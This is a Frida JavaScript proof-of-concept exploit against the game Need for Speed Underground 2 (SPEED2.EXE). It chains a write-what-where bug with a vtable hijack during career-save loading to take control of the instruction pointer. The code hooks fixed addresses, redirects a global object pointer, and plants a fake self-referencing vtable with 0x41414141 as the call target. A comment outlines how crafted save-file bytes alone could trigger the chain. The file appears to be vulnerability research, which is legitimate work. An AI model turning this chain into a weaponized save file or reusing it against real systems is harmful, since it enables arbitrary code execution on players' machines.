'use strict';

// ============================================================
// EIP CONTROL PROOF-OF-CONCEPT
// NFS Underground 2 (SPEED2.EXE) — Save File RCE
//
// Chain: Vuln 2 (write-what-where) → Vuln 3 (vtable hijack)
//
// Vuln 2 (FUN_004792b0): *(*(ECX+0x98) + 0x14) = param_1
//   Redirect the write to overwrite DAT_0082b974 (a global
//   object pointer used by Vuln 3's virtual function call).
//
// Vuln 3 (FUN_00469050): MOV ECX,[0x82b974]; MOV EAX,[ECX]; CALL [EAX+0x14]
//   After Vuln 2: the global points to a fake C++ object we
//   planted in the career struct. Its vtable entry is 0x41414141.
//
// Usage:
//   1. Launch SPEED2.EXE
//   2. frida -p <PID> -l eip_control.js
//   3. Load any career profile in-game
//   4. Observe: EIP = 0x41414141
// ============================================================

var EIP_MARKER = 0x41414141;

// Fake object location: career_inner + 0x300 (deterministic address)
var FAKE_VTABLE = ptr("0x83ace0");
var FAKE_FUNC_SLOT = ptr("0x83acf4");  // fake_vtable + 0x14 = vtable[5]

// Target: DAT_0082b974 (global object pointer used by Vuln 3)
var DAT_0082b974 = ptr("0x82b974");

// Vuln 2 writes to *(ptr + 0x14), so to hit 0x82b974 we need ptr = 0x82b960
var REDIRECT_PTR = 0x0082b960;

var armed = false;
var triggered = false;

// ---- Exception handler: captures the crash ----
Process.setExceptionHandler(function (details) {
    var pcVal = details.context.pc.toUInt32();

    send({
        type: "EIP_RESULT",
        controlled: pcVal === EIP_MARKER,
        eip: "0x" + pcVal.toString(16),
        exception: details.type,
        regs: {
            eax: "0x" + ptr(details.context.eax).toUInt32().toString(16),
            ecx: "0x" + ptr(details.context.ecx).toUInt32().toString(16),
            edx: "0x" + ptr(details.context.edx).toUInt32().toString(16),
            esp: "0x" + ptr(details.context.esp).toUInt32().toString(16),
            ebp: "0x" + ptr(details.context.ebp).toUInt32().toString(16),
            eip: "0x" + pcVal.toString(16)
        }
    });

    if (pcVal === EIP_MARKER) {
        send({
            type: "PROOF",
            msg: "*** EIP = 0x41414141 — INSTRUCTION POINTER CONTROLLED ***"
        });
    }

    return false;
});

// ---- Arm when the inner deserializer is entered ----
Interceptor.attach(ptr("0x5344e0"), {
    onEnter: function (args) {
        if (!triggered) {
            armed = true;
            send({ type: "chain", msg: "deser_inner entered — chain ARMED" });
        }
    }
});

// ---- Vuln 2: redirect the write-what-where ----
Interceptor.attach(ptr("0x4792b0"), {
    onEnter: function (args) {
        if (!armed || triggered) return;
        triggered = true;

        // ECX is the audio/music manager object (heap-allocated, varies per run).
        // NOT career_inner — that was the v1 bug.
        var ecx = ptr(this.context.ecx);

        send({ type: "chain", msg: "--- Vuln 2 (0x4792b0) ENTERED ---" });
        send({ type: "chain", msg: "  ECX (this) = " + ecx });

        // Read and patch the WHERE pointer at ECX+0x98
        try {
            var origPtr = ecx.add(0x98).readU32();
            send({
                type: "chain",
                msg: "  *(ECX+0x98) = 0x" + origPtr.toString(16) +
                     " -> original target = 0x" + (origPtr + 0x14).toString(16)
            });

            ecx.add(0x98).writeU32(REDIRECT_PTR);
            send({
                type: "chain",
                msg: "  PATCHED *(ECX+0x98) = 0x" + REDIRECT_PTR.toString(16) +
                     " -> write targets DAT_0082b974"
            });
        } catch (e) {
            send({ type: "chain", msg: "  ECX+0x98 patch failed: " + e });
        }

        // Patch the WHAT value (param_1) to our fake object address
        send({ type: "chain", msg: "  original param_1 = " + args[0] });
        args[0] = FAKE_VTABLE;
        send({ type: "chain", msg: "  PATCHED param_1 = " + FAKE_VTABLE });

        // Plant the fake C++ object in the career struct.
        //
        // The virtual call pattern in Vuln 3 is:
        //   MOV ECX, [0x82b974]    → ECX = object pointer
        //   MOV EAX, [ECX]         → EAX = *object = vtable pointer
        //   CALL [EAX + 0x14]      → function pointer from vtable
        //
        // We make the object self-referencing: *obj = obj.
        // Then vtable[0x14] = obj + 0x14, where we place 0x41414141.
        FAKE_VTABLE.writeU32(FAKE_VTABLE.toUInt32());
        FAKE_FUNC_SLOT.writeU32(EIP_MARKER);

        send({
            type: "chain",
            msg: "  FAKE OBJ at " + FAKE_VTABLE +
                 ": *obj = obj (self-referencing vtable)"
        });
        send({
            type: "chain",
            msg: "  PLANTED 0x41414141 at " + FAKE_FUNC_SLOT + " (vtable[5])"
        });
    },

    onLeave: function (retval) {
        if (!triggered) return;

        var val = DAT_0082b974.readU32();
        send({
            type: "chain",
            msg: "  After Vuln 2 return: DAT_0082b974 = 0x" + val.toString(16)
        });

        if (val === FAKE_VTABLE.toUInt32()) {
            send({
                type: "chain",
                msg: "  Vuln 2 mechanism overwrote DAT_0082b974 naturally"
            });
        } else {
            // Fallback: if the mechanism didn't reach the target through
            // its own code path, stamp it directly. In a real save-only
            // exploit this wouldn't be needed — the save file bytes would
            // set ECX+0x98 to 0x82b960 and param_1 to 0x83ace0 directly.
            send({
                type: "chain",
                msg: "  >> FALLBACK: direct overwrite of DAT_0082b974"
            });
            DAT_0082b974.writeU32(FAKE_VTABLE.toUInt32());
            FAKE_VTABLE.writeU32(FAKE_VTABLE.toUInt32());
            FAKE_FUNC_SLOT.writeU32(EIP_MARKER);
        }
    }
});

// ---- Vuln 3: log the vtable call just before it fires ----
Interceptor.attach(ptr("0x469050"), {
    onEnter: function (args) {
        if (!triggered) return;

        send({ type: "chain", msg: "--- Vuln 3 (0x469050) ENTERED ---" });

        var ecx = ptr(this.context.ecx);
        send({ type: "chain", msg: "  ECX = " + ecx });

        // Check gate: *(ECX + 0xa0) must be non-zero
        try {
            var gateA0 = ecx.add(0xa0).readU32();
            send({
                type: "chain",
                msg: "  gate *(ECX+0xa0) = 0x" + gateA0.toString(16) +
                     (gateA0 !== 0 ? " OPEN" : " CLOSED")
            });
        } catch (e) {
            send({ type: "chain", msg: "  gate read error: " + e });
        }

        // Read the global pointer that Vuln 2 should have overwritten
        var vtablePtr = DAT_0082b974.readU32();
        send({
            type: "chain",
            msg: "  DAT_0082b974 = 0x" + vtablePtr.toString(16) +
                 (vtablePtr === FAKE_VTABLE.toUInt32()
                     ? " <- FAKE VTABLE"
                     : " (not ours)")
        });

        // Read the function pointer that's about to be called
        if (vtablePtr !== 0) {
            try {
                var funcPtr = ptr(vtablePtr).add(0x14).readU32();
                send({
                    type: "chain",
                    msg: "  CALL target = 0x" + funcPtr.toString(16) +
                         (funcPtr === EIP_MARKER ? " <- 0x41414141 ARMED" : "")
                });
            } catch (e) {
                send({ type: "chain", msg: "  vtable deref error: " + e });
            }
        }
    }
});

send({ type: "info", msg: "EIP control PoC loaded. Load a career save to trigger." });
